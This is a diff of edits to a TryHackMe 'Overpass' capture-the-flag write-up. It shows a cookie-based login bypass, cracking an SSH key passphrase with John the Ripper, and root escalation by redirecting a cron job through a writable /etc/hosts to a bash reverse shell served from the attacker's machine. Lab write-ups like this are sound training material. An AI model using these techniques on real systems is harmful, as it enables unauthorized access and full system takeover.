@@ -117,7 +117,6 @@ async function login() {
 The most important section is the ```login()``` function, specifically the ```Cookies.set("SessionToken",statusOrCookie)```. With this information, I can set the Cookie to be blank, which bypasses the if statement (```if (statusOrCookie === "Incorrect credentials")```) and authenticates. I will set the Cookie in the Developer Tools console with: 
 ```
 Cookies.set("SessionToken","")
-
 ```
 After setting the Cookie, I simply reload the /admin page and I will authenticate and login. 
 
@@ -160,11 +159,11 @@ I attempted to authenticate with the rsa private key (make sure to set the corre
 ```
 Enter passphrase for key 'ssh_james': 
 ```
-Therefore, I needed to use John the Ripper, which required me to first use ssh2john to format properly. 
+Therefore, I needed to use John the Ripper to crack the passphrase for me. ssh2john is a great python script within john that helps me to format the private key for use with john. 
 ```
 ./ssh2john.py ~/TryHackMe/practice/ssh_james > /home/ajread/TryHackMe/practice/ssh_james_hash.txt
 ```
-Now that it is properly formatted, I can attempt to crack the passphrase with John the Ripper. I chose to use rockyou as the wordlist. 
+Now that it is properly formatted, I can attempt to crack the passphrase with John the Ripper. I used rockyou as the wordlist. 
 ```
 ./john --wordlist=/home/ajread/resources/wordlists/rockyou.txt /home/ajread/TryHackMe/practice/ssh_james_hash.txt
 ```
@@ -200,7 +199,7 @@ To Do:
 > Ask Paradox how he got the automated build script working and where the builds go.
   They're not updating on the website
 ```
-The note gave hints to a possible "automated build script" which points to a crontab. Looking at /etc/crontab:
+The note gave hints to a possible "automated build script" which makes me think about crontab. Looking at /etc/crontab:
 ```
 # /etc/crontab: system-wide crontab
 # Unlike any other crontab you don't have to run the `crontab'
@@ -229,7 +228,7 @@ GOOS=linux /usr/local/go/bin/go build -o ~/builds/overpassLinux ~/src/overpass.g
 ## GOOS=openbsd /usr/local/go/bin/go build -o ~/builds/overpassOpenBSD ~/src/overpass.go
 echo "$(date -R) Builds completed" >> /root/buildStatus
 ```
-Basically, the job runs and updates builds from latest code using go. If I can change the buildscript to execute a reverse shell, it will be executed by root and I will have escalated privileges. In order to do so, I noticed the ```overpass.thm``` in the crontab, meaning it references the ```/etc/hosts``` file to obtain the IP address. I can change the ```/etc/hosts``` file to point at my remote machine when it calls the buildscript. I know I can change the ```/etc/hosts``` file because of the permissions on the file. 
+Basically, the job runs and updates builds from latest code using go. If I can change the buildscript to execute a reverse shell, it will be executed by root and I will have escalated privileges. In order to do so, I noticed the ```overpass.thm``` in crontab, meaning it references the ```/etc/hosts``` file to obtain the correct IP address. Therefore, if I can change the ```/etc/hosts``` file to point at my remote machine when it calls the buildscript, the job will call my attack box IP address and run the buildscript on my machine. To ensure I can update ```/etc/hosts``` file I checked the permissions. 
 ```
 -rw-rw-rw- 1 root root 250 Jun 27  2020 /etc/hosts
 ```
@@ -245,7 +244,7 @@ ff00::0 ip6-mcastprefix
 ff02::1 ip6-allnodes
 ff02::2 ip6-allrouters
 ```
-It needs to be changed to reflect the below.
+It needs to be changed to reflect my local/attack box IP. 
 ```
 127.0.0.1 localhost
 127.0.1.1 overpass-prod
@@ -257,11 +256,11 @@ ff00::0 ip6-mcastprefix
 ff02::1 ip6-allnodes
 ff02::2 ip6-allrouters
 ```
-Let me create a reverse shell in bash and place it within my local machine at /downloads/src/buildscript.sh
+Let me create a reverse shell in bash and place it within my local machine at ```/downloads/src/buildscript.sh```. 
 ```
 echo "bash -i >& /dev/tcp/[Local IP]/5555 0>&1" > buildscript.sh
 ```
-After creating the buildscript, I need to start up a python3 http server on port 80 for the remote machine to call with the crontab. 
+After creating the buildscript, I need to start up a python3 http server on port 80 in the parent directory of ```/downloads/src/buildscript.sh```for the remote machine to call with the crontab. 
 ```
 sudo python3 -m http.server 80
 ```
@@ -270,10 +269,13 @@ Now, in a different terminal, I start a netcat listener on port 5555 to receive 
 nc -lnvp 5555
 ```
 After a certain period of time, the job calls the build script, creates a reverse shell and escalates privilege! 
+
+I can see the HTTP GET request by the Overpass machine to my local machine. 
 ```
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 10.10.118.191 - - [18/Feb/2022 08:00:01] "GET /downloads/src/buildscript.sh HTTP/1.1" 200 -
 ```
+In the terminal where my netcat listener is set up, I am dropped into a root shell. 
 ```
 root@overpass-prod:~# id
 id
